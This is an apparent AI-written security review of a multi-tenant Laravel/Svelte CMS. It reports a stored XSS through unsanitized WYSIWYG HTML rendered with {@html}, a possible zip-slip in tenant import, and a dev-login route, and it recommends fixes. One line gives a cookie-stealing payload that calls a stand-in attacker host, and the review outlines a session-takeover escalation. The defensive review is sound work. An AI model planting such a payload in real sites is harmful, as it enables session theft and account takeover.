Security Review Findings

  I reviewed the Laravel/Inertia/Svelte multi-tenant CMS, focusing on file uploads, tenant isolation, auth, and
  injection surfaces. Overall the app is well-built defensively (allow-listed upload targets, Fillable attributes
  instead of $request->all(), tenant-scoped DB connections, CSRF handled by default Laravel middleware,
  rate-limited logins, secure random passwords, SVG explicitly excluded from image uploads, dev-login route
  double-guarded). One significant issue stood out; a couple of lower-severity items are worth a look.

  ---
  [HIGH] Stored XSS via unsanitized WYSIWYG content rendered with {@html}
  File: app/Http/Controllers/Admin/SectionController.php:20-22,
  app/Http/Controllers/Admin/PostController.php:39-46
  Rendered at: resources/themes/*/templates/*.svelte (e.g. resources/themes/default/Wysiwyg.svelte:27,
  resources/themes/geko/templates/Page.svelte:22, resources/themes/dvm/templates/Page.svelte:55,
  Contact.svelte:45, Aktuelles.svelte:34)
  
  Issue: `Section::update` and `Post::update` accept the `value`/`body` field as
  a raw string (`'value' => ['nullable', 'string']`) with no HTML sanitization
  (no HTMLPurifier or similar). The frontend UI generates this HTML via Tiptap,
  but nothing on the server enforces that shape — a direct authenticated
  PATCH request (e.g. `PATCH /admin/pages/{page}/sections/{section}` or
  `PATCH /admin/posts/{post}`) can submit arbitrary HTML/JS. Every theme's
  "wysiwyg"-type template renders that value straight into the DOM with
  Svelte's `{@html sections.body.value}`, unescaped, on the *public,
  unauthenticated* site.
  
  Impact: Any account with `editor` (the lowest privileged, client-facing
  role) can plant a persistent XSS payload, e.g.
  `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`,
  that executes in the browser of every visitor to that public page. Because
  the CSRF cookie (`XSRF-TOKEN`) is intentionally JS-readable (used by
  ImageUpload.svelte/TiptapEditor.svelte's own fetch calls), a payload viewed
  by a logged-in `editor` or `superadmin` (e.g. previewing the live page while
  authenticated in another tab on the same origin) can read that cookie and
  issue authenticated fetch requests to any `/admin/*` endpoint on the
  attacker's behalf — turning this into full account/session takeover and
  effective privilege escalation from editor to superadmin, not just
  "defacement" XSS against anonymous visitors.
  
  Evidence:
  - SectionController::update / PostController::update validate `value`/`body`
    only as `nullable|string` — no sanitizer applied before persisting.
  - Multiple theme templates render it with `{@html sections.body.value}` /
    `{@html post.body}` with no client-side sanitization either (no DOMPurify
    in the bundle — confirmed via package.json / grep for sanitize/purify).

  Recommendation: Sanitize rich-text HTML server-side before persisting (e.g.
  an HTML Purifier pass restricted to the tag/attribute allow-list Tiptap
  actually produces — bold/italic/headings/lists/blockquote/links/images —
  stripping `on*` attributes, `javascript:`/`data:` URLs, `<script>`,
  `<iframe>`, `style`, etc.), and/or sanitize again at render time before
  `{@html}` is used. Apply this to both `Section::value` (wysiwyg type) and
  `Post::body`.

  [NEEDS REVIEW] Zip extraction in tenant import may be vulnerable to zip-slip / path traversal
  File: app/Services/TenantContentImporter.php:98-117 (extract), :246-256 (recreateMedia)

  Issue: `ZipArchive::extractTo($extractDir)` extracts an operator-supplied
  .zip without validating entry names for `../` traversal, and
  `recreateMedia()` later builds a path from `$item['archive_file']` taken
  directly from `manifest.json` inside that same archive
  (`$extractDir.'/media/'.$item['archive_file']`) before handing it to
  `addMedia()`. Modern `ZipArchive` has some built-in protection against `..`
  traversal, but this hasn't been verified for this exact PHP/zip combination,
  and the manifest-driven filename isn't independently constrained (e.g. no
  `basename()`/allow-list check).

  Impact: If a hostile "export" .zip is ever imported (e.g. downloaded from an
  untrusted source, or a compromised client sends you "their site backup" to
  restore), a crafted `archive_file`/entry path could write files outside the
  intended temp extraction directory.

  Evidence: No basename/allow-list normalization on `archive_file` before path
  concatenation; extraction destination isn't verified against `$extractDir`
  after extraction.

  Recommendation: This is a CLI-only, operator-invoked path (not web
  reachable), so real-world exploitability depends on operators importing
  untrusted archives. Still worth hardening: reject entries containing `..` or
  absolute paths during/after extraction, and apply `basename()` (or a
  strict `^[\w.\-]+$` check) to `archive_file` before building the media source
  path.

  [LOW] Local dev-login backdoor route is always registered
  File: routes/tenant.php:53, app/Http/Controllers/Admin/AuthController.php:80-92

  Issue: `/admin/dev-login` performs a real login (as the first editor user)
  and is registered unconditionally in every environment; it's only gated by
  a runtime `abort_unless(app()->environment('local'), 404)` check inside the
  controller. This is intentional and explicitly documented/guarded against a
  stale route cache — so it's not currently exploitable as long as
  `APP_ENV=production` is set correctly, per the project's own security
  considerations. Flagging only because the consequence of that single env
  var being wrong in a deployment is a full unauthenticated admin login on
  every tenant.

  Impact: None under correct configuration; full auth bypass into any
  tenant's admin if `APP_ENV` is ever misconfigured as non-`local` in a
  publicly reachable environment (e.g. `staging`/`testing` exposed to the
  internet).

  Recommendation: No code change strictly required — the guard is sound — but
  consider also excluding the route entirely outside local via
  `Route::get(...)->middleware('web')` conditioned on `app()->environment('local')`
  at route-registration time (belt-and-suspenders), and ensure deployment
  docs/checklists explicitly verify `APP_ENV=production` post-deploy.

  ---
  What I checked and found clean

  - File uploads (MediaController) — targets are allow-listed by model/collection (section/post only), file rules
  use Laravel's image/mimes validation with max:10240, and critically the plain 'image' rule in this Laravel
  version does not allow SVG by default (confirmed in vendor/laravel/framework/.../Rules/File.php — allow_svg
  must be explicitly opted into, which this code doesn't do), so the classic SVG-script stored-XSS-via-upload
  vector is closed. Uploaded files are served through a controller (MediaController::show) with an explicit
  Content-Type rather than executed by PHP, and live outside the public webroot (storage/tenant<id>/app/public),
  so there's no RCE-via-upload path.
  - Tenant isolation — all tenant data access happens after InitializeTenancyByDomain switches the DB connection;
  Eloquent model binding (Media, Section, Post, Page) is therefore naturally scoped per tenant. Sessions, cache
  (tag-based), and queue are tenant-scoped via stancl/tenancy bootstrappers.
  - Auth — bcrypt via Hash, rate-limited login (5/60s) on both tenant and superadmin login, session regeneration
  on login/logout, vague error messages (no user enumeration), CSRF protected globally (no VerifyCsrfToken
  exceptions found), no CORS config published (safe default).
  - Mass assignment — models use explicit #[Fillable([...])] allow-lists and controllers build explicit
  $validated arrays; no $request->all() passed to Eloquent anywhere.
  - Secrets/config — no hardcoded credentials, no md5/sha1 usage, no eval/shell_exec/system calls, no dangerous
  php.ini settings, tenant passwords generated with Str::password(16).

  The stored-XSS finding above is the one issue I'd treat as a priority fix before this goes live for real
  clients, given the CSRF-cookie-theft escalation path.
